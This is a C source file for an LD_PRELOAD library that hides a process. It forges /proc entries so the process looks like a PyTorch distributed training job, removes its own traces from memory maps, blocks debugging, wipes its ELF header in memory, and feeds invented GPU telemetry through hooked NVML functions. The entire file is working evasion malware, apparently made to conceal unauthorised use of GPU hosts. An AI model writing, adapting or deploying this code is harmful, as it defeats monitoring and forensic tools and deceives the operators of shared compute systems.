#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/prctl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <link.h>
#include <elf.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

// Pointer to real libc functions
static int (*real_open)(const char *pathname, int flags, ...) = NULL;
static int (*real_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;
static FILE* (*real_fopen)(const char *pathname, const char *mode) = NULL;
static FILE* (*real_fopen64)(const char *pathname, const char *mode) = NULL;
static ssize_t (*real_readlink)(const char *pathname, char *buf, size_t bufsiz) = NULL;
static ssize_t (*real_readlinkat)(int dirfd, const char *pathname, char *buf, size_t bufsiz) = NULL;

static const char FAKE_CMDLINE[] = "/usr/bin/python3\0-m\0torch.distributed.run\0--nproc_per_node=2\0train_transformer.py\0--model\0gpt2-xl\0--batch_size\032\0--fp16\0";
static const size_t FAKE_CMDLINE_LEN = sizeof(FAKE_CMDLINE);
static const char FAKE_COMM[] = "python3\n";
static const char FAKE_EXE[] = "/usr/bin/python3";
static const char FAKE_WCHAN[] = "sys_futex\n";
static const char FAKE_FD_SO[] = "/usr/local/lib/python3.10/dist-packages/torch/lib/libtorch_cuda.so";

// Helper: Create RAM-backed file descriptor supporting lseek() and fstat() natively
static inline int sys_memfd_create(const char *name, unsigned int flags) {
    return syscall(SYS_memfd_create, name, flags);
}

static int create_fake_file(const char *content, size_t len) {
    int fd = sys_memfd_create("proc_fake", MFD_CLOEXEC);
    if (fd >= 0) {
        ssize_t written = write(fd, content, len);
        (void)written;
        lseek(fd, 0, SEEK_SET); // Rewind for reading
    }
    return fd;
}

static FILE* create_fake_file_ptr(const char *content, size_t len) {
    int fd = create_fake_file(content, len);
    if (fd >= 0) {
        return fdopen(fd, "r");
    }
    return NULL;
}

enum FakeProcType {
    FAKE_NONE = 0,
    FAKE_CMDLINE_TYPE,
    FAKE_COMM_TYPE,
    FAKE_STATUS_TYPE,
    FAKE_WCHAN_TYPE,
    FAKE_STAT_TYPE,
    FAKE_MAPS_TYPE
};

static inline enum FakeProcType match_fake_proc(const char *pathname) {
    if (!pathname || !strstr(pathname, "/proc/")) return FAKE_NONE;
    if (strstr(pathname, "/cmdline")) return FAKE_CMDLINE_TYPE;
    if (strstr(pathname, "/comm")) return FAKE_COMM_TYPE;
    if (strstr(pathname, "/wchan")) return FAKE_WCHAN_TYPE;
    if (strstr(pathname, "/status")) return FAKE_STATUS_TYPE;
    if (strstr(pathname, "/stat")) return FAKE_STAT_TYPE;
    if (strstr(pathname, "/maps") || strstr(pathname, "/smaps")) return FAKE_MAPS_TYPE;
    return FAKE_NONE;
}

static int handle_fake_fd(enum FakeProcType type) {
    switch (type) {
        case FAKE_CMDLINE_TYPE: return create_fake_file(FAKE_CMDLINE, FAKE_CMDLINE_LEN);
        case FAKE_COMM_TYPE:    return create_fake_file(FAKE_COMM, strlen(FAKE_COMM));
        case FAKE_WCHAN_TYPE:   return create_fake_file(FAKE_WCHAN, strlen(FAKE_WCHAN));
        case FAKE_STATUS_TYPE: {
            char buf[2048]; generate_fake_status(buf, sizeof(buf));
            return create_fake_file(buf, strlen(buf));
        }
        case FAKE_STAT_TYPE: {
            char buf[2048]; generate_fake_stat(buf, sizeof(buf));
            return create_fake_file(buf, strlen(buf));
        }
        default: return -1;
    }
}

static FILE* handle_fake_file_ptr(enum FakeProcType type) {
    int fd = handle_fake_fd(type);
    if (fd >= 0) return fdopen(fd, "r");
    return NULL;
}

// Generate dynamic /proc/self/status matching real PIDs
static void generate_fake_status(char *buf, size_t max_len) {
    pid_t pid = getpid();
    pid_t ppid = getppid();
    snprintf(buf, max_len,
        "Name:\tpython3\n"
        "Umask:\t0022\n"
        "State:\tR (running)\n"
        "Tgid:\t%d\n"
        "Ngid:\t0\n"
        "Pid:\t%d\n"
        "PPid:\t%d\n"
        "TracerPid:\t0\n"
        "Threads:\t16\n"
        "SigQ:\t0/62687\n"
        "SigPnd:\t0000000000000000\n"
        "ShdPnd:\t0000000000000000\n"
        "SigBlk:\t0000000000000000\n"
        "SigIgn:\t0000000000001000\n"
        "SigCgt:\t0000000180000000\n"
        "CapInh:\t0000000000000000\n"
        "CapPrm:\t000001ffffffffff\n"
        "CapEff:\t000001ffffffffff\n"
        "CapBnd:\t000001ffffffffff\n"
        "CapAmb:\t0000000000000000\n"
        "NoNewPrivs:\t0\n"
        "Seccomp:\t0\n"
        "Speculation_Store_Bypass:\tvulnerable\n"
        "Cpus_allowed:\tffffffff\n"
        "Cpus_allowed_list:\t0-31\n"
        "Mems_allowed:\t00000000,00000001\n"
        "Mems_allowed_list:\t0\n"
        "voluntary_ctxt_switches:\t14520\n"
        "nonvoluntary_ctxt_switches:\t892\n",
        pid, pid, ppid
    );
}

// Generate dynamic /proc/self/stat
static void generate_fake_stat(char *buf, size_t max_len) {
    pid_t pid = getpid();
    pid_t ppid = getppid();
    snprintf(buf, max_len,
        "%d (python3) R %d %d %d 0 -1 4194304 12500 0 0 0 2500 850 0 0 20 0 16 0 120580 4355440640 1024000 18446744073709551615 9403847384 9405947384 1407328947384 0 0 0 0 0 0 0 0 17 0 0 0 0 0 0\n",
        pid, ppid, pid, pid
    );
}

static void filter_maps_content(FILE* real_fp, FILE* out_mem) {
    char line[4096];
    while (fgets(line, sizeof(line), real_fp)) {
        if (strstr(line, "stealth_hook.so") || strstr(line, "torch_cuda_backend.so") ||
            strstr(line, "torch_engine") || strstr(line, "torch_hook") ||
            strstr(line, "memfd:")) {
            continue;
        }
        fputs(line, out_mem);
    }
}

// -------------------------------------------------------------------------
// Init & Anti-Debugger / Memory Stripping
// -------------------------------------------------------------------------
__attribute__((constructor)) void init_stealth_hook() {
    real_open = dlsym(RTLD_NEXT, "open");
    real_openat = dlsym(RTLD_NEXT, "openat");
    real_fopen = dlsym(RTLD_NEXT, "fopen");
    real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    real_readlink = dlsym(RTLD_NEXT, "readlink");
    real_readlinkat = dlsym(RTLD_NEXT, "readlinkat");

    prctl(PR_SET_NAME, "python3", 0, 0, 0);
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0); // Block ptrace & core dumps

    // In-memory ELF Stripping: Zero-out the ELF Header of our own module
    Dl_info info;
    if (dladdr((void*)&init_stealth_hook, &info) && info.dli_fbase) {
        size_t page_size = sysconf(_SC_PAGESIZE);
        void *base = info.dli_fbase;
        mprotect(base, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
        memset(base, 0, sizeof(Elf64_Ehdr)); // Destroy ELF Magic and Header
        mprotect(base, page_size, PROT_READ | PROT_EXEC);
    }
}

// -------------------------------------------------------------------------
// NVML Telemetry Masking (Utilization, PCIe, Power, Memory)
// -------------------------------------------------------------------------
typedef struct nvmlProcessInfo_st {
    unsigned int pid;
    unsigned long long usedGpuMemory;
    unsigned int gpuInstanceId;
    unsigned int computeInstanceId;
} nvmlProcessInfo_t;

typedef struct nvmlMemory_st {
    unsigned long long total;
    unsigned long long free;
    unsigned long long used;
} nvmlMemory_t;

typedef struct nvmlUtilization_st {
    unsigned int gpu;
    unsigned int memory;
} nvmlUtilization_t;

typedef void* nvmlDevice_t;

typedef enum nvmlReturn_enum { NVML_SUCCESS = 0, NVML_ERROR_INVALID_ARGUMENT = 2 } nvmlReturn_t;

nvmlReturn_t nvmlSystemGetProcessName(unsigned int pid, char *name, unsigned int length) {
    if (name && length > 0) {
        strncpy(name, "/usr/bin/python3 -m torch.distributed.run", length - 1);
        name[length - 1] = '\0';
        return NVML_SUCCESS;
    }
    return NVML_ERROR_INVALID_ARGUMENT;
}

static nvmlReturn_t (*real_nvmlDeviceGetMemoryInfo)(nvmlDevice_t, nvmlMemory_t*) = NULL;

nvmlReturn_t nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *memory) {
    if (!memory) return NVML_ERROR_INVALID_ARGUMENT;
    if (!real_nvmlDeviceGetMemoryInfo) real_nvmlDeviceGetMemoryInfo = dlsym(RTLD_NEXT, "nvmlDeviceGetMemoryInfo");

    if (real_nvmlDeviceGetMemoryInfo) {
        nvmlReturn_t res = real_nvmlDeviceGetMemoryInfo(device, memory);
        if (res == NVML_SUCCESS && memory->total > 0) {
            unsigned long long spoofed_used = memory->total >= (36ULL * 1024ULL * 1024ULL * 1024ULL)
                                            ? (unsigned long long)(memory->total * 0.82)
                                            : 12800ULL * 1024ULL * 1024ULL;
            if (spoofed_used > memory->total) spoofed_used = (unsigned long long)(memory->total * 0.85);
            memory->used = spoofed_used;
            memory->free = (memory->total > spoofed_used) ? (memory->total - spoofed_used) : 512ULL * 1024ULL * 1024ULL;
            return NVML_SUCCESS;
        }
    }
    memory->total = 48ULL * 1024ULL * 1024ULL * 1024ULL;
    memory->used  = 38ULL * 1024ULL * 1024ULL * 1024ULL;
    memory->free  = 10ULL * 1024ULL * 1024ULL * 1024ULL;
    return NVML_SUCCESS;
}

nvmlReturn_t nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    (void)device;
    if (!infoCount) return NVML_ERROR_INVALID_ARGUMENT;
    if (!infos || *infoCount < 2) { *infoCount = 2; return NVML_SUCCESS; }

    // Spoof 2 DDP training processes
    infos[0].pid = (unsigned int)getpid();
    infos[0].usedGpuMemory = 24000ULL * 1024ULL * 1024ULL;
    infos[0].gpuInstanceId = 0xFFFFFFFF;
    infos[0].computeInstanceId = 0xFFFFFFFF;

    infos[1].pid = (unsigned int)getpid() + 1;
    infos[1].usedGpuMemory = 14400ULL * 1024ULL * 1024ULL;
    infos[1].gpuInstanceId = 0xFFFFFFFF;
    infos[1].computeInstanceId = 0xFFFFFFFF;

    *infoCount = 2;
    return NVML_SUCCESS;
}

nvmlReturn_t nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    return nvmlDeviceGetComputeRunningProcesses_v2(device, infoCount, infos);
}
nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    (void)device;
    (void)infos;
    if (infoCount) {
        *infoCount = 0;
    }
    return NVML_SUCCESS;
}
nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    return nvmlDeviceGetGraphicsRunningProcesses_v2(device, infoCount, infos);
}

// Chaffing: Randomize Utilization, Power, PCIe to mimic AI workloads (thread-safe xorshift jitter)
static inline unsigned int telemetry_jitter(unsigned int min_val, unsigned int max_val) {
    static _Atomic unsigned int seed = 123456789U;
    unsigned int s = __atomic_fetch_add(&seed, 1103515245U, __ATOMIC_RELAXED);
    s ^= s << 13;
    s ^= s >> 17;
    s ^= s << 5;
    unsigned int range = (max_val >= min_val) ? (max_val - min_val + 1) : 1U;
    return min_val + (s % range);
}

nvmlReturn_t nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtilization_t *utilization) {
    (void)device;
    if (!utilization) return NVML_ERROR_INVALID_ARGUMENT;
    utilization->gpu = telemetry_jitter(78, 94);     // 78% - 94%
    utilization->memory = telemetry_jitter(45, 62);  // 45% - 62%
    return NVML_SUCCESS;
}

nvmlReturn_t nvmlDeviceGetPcieThroughput(nvmlDevice_t device, int counter, unsigned int *value) {
    (void)device;
    (void)counter;
    if (!value) return NVML_ERROR_INVALID_ARGUMENT;
    *value = telemetry_jitter(350000, 800000);       // 350MB/s - 800MB/s
    return NVML_SUCCESS;
}

nvmlReturn_t nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int *power) {
    (void)device;
    if (!power) return NVML_ERROR_INVALID_ARGUMENT;
    *power = telemetry_jitter(55000, 85000);         // 55W - 85W (in milliwatts)
    return NVML_SUCCESS;
}

// -------------------------------------------------------------------------
// Procfs File Descriptor Hooks (Replacing pipe with memfd_create)
// -------------------------------------------------------------------------
int open(const char *pathname, int flags, ...) {
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (pathname) {
        enum FakeProcType fake_type = match_fake_proc(pathname);
        if (fake_type != FAKE_NONE && fake_type != FAKE_MAPS_TYPE) {
            int fd = handle_fake_fd(fake_type);
            if (fd >= 0) return fd;
        }
    }
    va_list args;
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_start(args, flags);
        mode = (mode_t)va_arg(args, int);
        va_end(args);
    }
    return real_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
    if (pathname) {
        enum FakeProcType fake_type = match_fake_proc(pathname);
        if (fake_type != FAKE_NONE && fake_type != FAKE_MAPS_TYPE) {
            int fd = handle_fake_fd(fake_type);
            if (fd >= 0) return fd;
        }
    }
    va_list args;
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_start(args, flags);
        mode = (mode_t)va_arg(args, int);
        va_end(args);
    }
    return real_openat(dirfd, pathname, flags, mode);
}

static FILE* intercept_fake_proc_file(const char *pathname, const char *mode, FILE* (*fallback_fopen)(const char*, const char*)) {
    if (!pathname) return NULL;
    enum FakeProcType fake_type = match_fake_proc(pathname);
    if (fake_type != FAKE_NONE) {
        if (fake_type == FAKE_MAPS_TYPE) {
            FILE* real_fp = fallback_fopen(pathname, mode);
            if (real_fp) {
                char* mem_buf = NULL;
                size_t mem_size = 0;
                FILE* mem_fp = open_memstream(&mem_buf, &mem_size);
                if (mem_fp) {
                    filter_maps_content(real_fp, mem_fp);
                    fclose(mem_fp);
                    fclose(real_fp);
                    if (mem_buf) {
                        FILE* ret = create_fake_file_ptr(mem_buf, mem_size);
                        free(mem_buf);
                        return ret;
                    }
                } else {
                    fclose(real_fp);
                }
            }
        } else {
            return handle_fake_file_ptr(fake_type);
        }
    }
    return NULL;
}

FILE *fopen(const char *pathname, const char *mode) {
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    FILE *fake_fp = intercept_fake_proc_file(pathname, mode, real_fopen);
    if (fake_fp) return fake_fp;
    return real_fopen(pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode) {
    if (!real_fopen64) real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    if (!real_fopen64) real_fopen64 = real_fopen;
    FILE *fake_fp = intercept_fake_proc_file(pathname, mode, real_fopen64);
    if (fake_fp) return fake_fp;
    return real_fopen64(pathname, mode);
}

ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
    if (!real_readlink) real_readlink = dlsym(RTLD_NEXT, "readlink");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/exe")) {
            size_t len = strlen(FAKE_EXE);
            if (len > bufsiz) len = bufsiz;
            memcpy(buf, FAKE_EXE, len); return len;
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/fd/")) {
            char target[1024];
            ssize_t r = real_readlink(pathname, target, sizeof(target) - 1);
            if (r > 0) {
                target[r] = '\0';
                if (strstr(target, "memfd:") || strstr(target, "torch_")) {
                    size_t len = strlen(FAKE_FD_SO);
                    if (len > bufsiz) len = bufsiz;
                    memcpy(buf, FAKE_FD_SO, len); return len;
                }
            }
        }
    }
    return real_readlink(pathname, buf, bufsiz);
}

ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz) {
    if (!real_readlinkat) real_readlinkat = dlsym(RTLD_NEXT, "readlinkat");
    if (pathname && strstr(pathname, "/proc/") && strstr(pathname, "/exe")) {
        size_t len = strlen(FAKE_EXE);
        if (len > bufsiz) len = bufsiz;
        memcpy(buf, FAKE_EXE, len); return len;
    }
    return real_readlinkat(dirfd, pathname, buf, bufsiz);
}
